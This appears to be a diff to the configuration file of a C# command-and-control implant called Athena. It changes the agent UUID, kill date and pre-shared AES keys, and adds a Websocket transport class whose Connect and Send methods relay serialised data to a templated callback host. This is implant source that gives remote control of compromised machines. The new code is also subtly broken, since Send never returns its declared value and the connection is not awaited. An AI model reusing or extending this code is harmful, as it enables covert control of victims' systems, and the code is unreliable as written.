@@ -1,7 +1,11 @@
-﻿using Athena.Utilities;
+﻿#define PROFILETYPE
+
+using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
 using System.Net.Http;
+using System.Net.WebSockets;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Athena.Config
@@ -20,16 +24,16 @@ namespace Athena.Config
 
             //this.uuid = "%UUID%";
             //this.killDate = DateTime.Parse("killdate");
-            //int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 60;
+            //int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             //this.sleep = sleep;
             //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             //this.jitter = jitter;
             //this.httpConfig = new HTTPS(this.uuid);
             //this.smbConfig = new SMB();
             //this.websocketConfig = new Websocket();          
-            this.uuid = "45f655d8-9999-47ae-8be6-f1965c70fb51";
+            this.uuid = "27210835-8685-4744-a2ab-c504c499c4e5";
             this.killDate = DateTime.Parse("2022-08-22");
-            int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 10;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 10;
             this.sleep = sleep;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
@@ -57,7 +61,6 @@ namespace Athena.Config
 
         public HTTPS(string uuid)
         {
-
             //int callbackPort = Int32.Parse("callback_port");
             //string callbackHost = "callback_host";
             //string callbackURL = $"{callbackHost}:{callbackPort}";
@@ -83,7 +86,7 @@ namespace Athena.Config
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
-            this.psk = "4muIu7PVcP2QK/qTgjJvVLVxvTR8vz/S11skV7kM0/M=";
+            this.psk = "EJWwOWUKwZ3ESBjh3TyzdeCTbqFKLssGDZbX+7BTLNc=";
             
             //Doesn't do anything yet
             this.encryptedExchangeCheck = bool.Parse("True");
@@ -131,7 +134,56 @@ namespace Athena.Config
     }
     public class Websocket
     {
+        public string psk { get; set; }
+        public string endpoint { get; set; }
+        public string userAgent { get; set; }
+        public string callbackHost { get; set; }
+        public int callbackInterval { get; set; }
+        public int callbackJitter { get; set; }
+        public int callbackPort { get; set; }
+        public string hostHeader { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+        public ClientWebSocket ws { get; set; }
 
+        public Websocket()
+        {
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            string callbackURL = $"{callbackHost}:{callbackPort}";
+            this.endpoint = "ENDPOINT_REPLACE";
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
+            this.psk = "AESPSK";
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        }
+
+        public bool Connect(string url)
+        {
+            try
+            {
+                ws = new ClientWebSocket();
+                ws.ConnectAsync(new Uri(url), CancellationToken.None);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public async Task<string> Send(object obj)
+        {
+            try
+            {
+                string json = JsonConvert.SerializeObject(obj);
+                byte[] msg = System.Text.Encoding.ASCII.GetBytes(json);
+                await ws.SendAsync(msg, WebSocketMessageType.Text,true, CancellationToken.None);
+            }
+            catch (Exception e)
+            {
+
+            }
+        }
     }
     public class SMB
     {
